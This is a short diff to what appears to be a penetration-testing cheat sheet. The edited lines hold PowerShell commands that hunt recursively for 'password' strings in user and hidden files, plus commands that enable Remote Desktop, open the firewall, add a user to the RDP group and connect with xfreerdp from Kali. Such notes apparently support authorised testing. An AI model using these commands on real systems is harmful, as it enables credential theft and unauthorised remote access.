@@ -265,7 +265,7 @@ Get-ChildItem -file -recurse -erroraction silentlycontinue -include '*.txt' | ge
 Get-ChildItem -file -recurse -erroraction silentlycontinue -include '*Console*' -path c:\users
 Get-ChildItem -file -recurse -erroraction silentlycontinue -include '*.txt' -path c:\users
 Get-ChildItem -file -recurse -erroraction silentlycontinue -path c:\users -hidden | get-content -erroraction silentlycontinue | select-string -pattern 'password'
-Get-ChildItem -file -recurse -erroraction silentlycontinue -path c:\users -hidden | get-content -erroraction silentlycontinue | select-string -pattern 'password' | Select-String -Pattern "^.{0,100}" | % { $Matches[0] }
+Get-ChildItem -file -recurse -erroraction silentlycontinue | get-content -erroraction silentlycontinue | select-string -pattern 'password' | Select-String -Pattern "^.{0,100}" | foreach-object { $_.Matches[0].value }
 ```
 Uploads:
 ```
@@ -297,13 +297,13 @@ smb: \> mget *
 
 On the target, in PowerShell:
 ```
-Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -name "fDenyTSConnections" -value 0
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 Add-LocalGroupMember -Group "Remote Desktop Users" -Member someuser
 ```
 In Kali:
 ```
-xfreerdp /u:someuser /p:'somepass' /v:$IP /d:somedomnoext
+xfreerdp /u:someuser /p:'somepass' /v:$IP /d:somedomNOEXTENSION
 ```
 
 ### Administrator, add
